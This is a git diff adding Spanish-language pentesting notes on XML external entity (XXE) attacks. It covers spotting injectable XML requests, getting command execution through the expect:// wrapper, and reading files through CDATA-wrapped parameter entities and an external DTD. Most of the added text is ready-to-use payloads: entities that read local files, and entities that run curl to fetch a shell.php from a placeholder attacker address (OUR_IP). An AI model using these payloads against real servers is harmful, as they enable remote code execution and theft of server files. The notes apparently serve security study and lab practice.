@@ -43,6 +43,7 @@
     - Automatizar la modificación de esos parámetros para acceder a recursos no autorizados.
     - Observar si la aplicación web permite el acceso a recursos no autorizados.
 - Script de ejemplo:
+
 ```bash
 #!/bin/bash
 
@@ -82,3 +83,42 @@ done
     - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>`
 
 ### Identificando XXE
+- Primero tenemos que encontrar una petición que permita la inclusión de archivos XML externas.
+- Puede ser desde un formulario, una solicitud HTTP, un archivo de configuración, un excel, etc.
+- [Payloads list](https://github.com/payloadbox/xxe-injection-payload-list)
+
+### RCE con XXE
+- Podemos utilizar el siguiente payload para ejecutar comandos en el servidor:
+    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://ls" >]><foo>&xxe;</foo>`
+    - `<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">`
+    - `<!ENTITY % file SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">%file;`
+
+### Filtración con CDATA
+- Para filtrar el contenido de una aplicación web, se puede utilizar la directiva CDATA.
+- La directiva CDATA se utiliza para filtrar el contenido de una aplicación web.
+- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar la directiva CDATA para filtrar el contenido de la aplicación web.
+- Payloads:
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+#### Parametros en declaraciones de entidades
+- Las declaraciones de entidades pueden contener parámetros que se utilizan para reemplazar valores dinámicos en la declaración de entidad.
+- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar parámetros para reemplazar el contenido de la aplicación web.
+- utilizamos `%` para poner parámetros en declaraciones de entidades.
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/SOME-FILE.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:PORT/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+- Desde la maquina atacante tenemos que xxe: `<!ENTITY joined "%begin;%file;%end;">`
